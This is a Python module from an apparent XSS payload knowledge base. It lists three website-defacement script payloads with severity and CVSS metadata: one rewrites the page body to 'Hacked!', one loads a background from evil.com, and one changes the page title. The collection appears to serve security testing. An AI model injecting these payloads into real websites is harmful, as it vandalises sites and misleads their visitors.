#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Website Defacement Payloads
"""

from ..models import PayloadEntry


DEFACEMENT_PAYLOADS = {
    "deface_1": PayloadEntry(
        payload="<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Simple defacement",
        tags=["defacement", "innerHTML"],
        reliability="high",
    ),
    "deface_2": PayloadEntry(
        payload="<script>document.body.style.background='url(//evil.com/bg.jpg)'</script>",
        contexts=["html_content", "javascript"],
        severity="low",
        cvss_score=4.0,
        description="Background change",
        tags=["defacement", "background"],
        reliability="high",
    ),
    "deface_3": PayloadEntry(
        payload="<script>document.title='Hacked'</script>",
        contexts=["html_content", "javascript"],
        severity="low",
        cvss_score=3.0,
        description="Title change",
        tags=["defacement", "title"],
        reliability="high",
    ),
}

DEFACEMENT_PAYLOADS_TOTAL = len(DEFACEMENT_PAYLOADS)
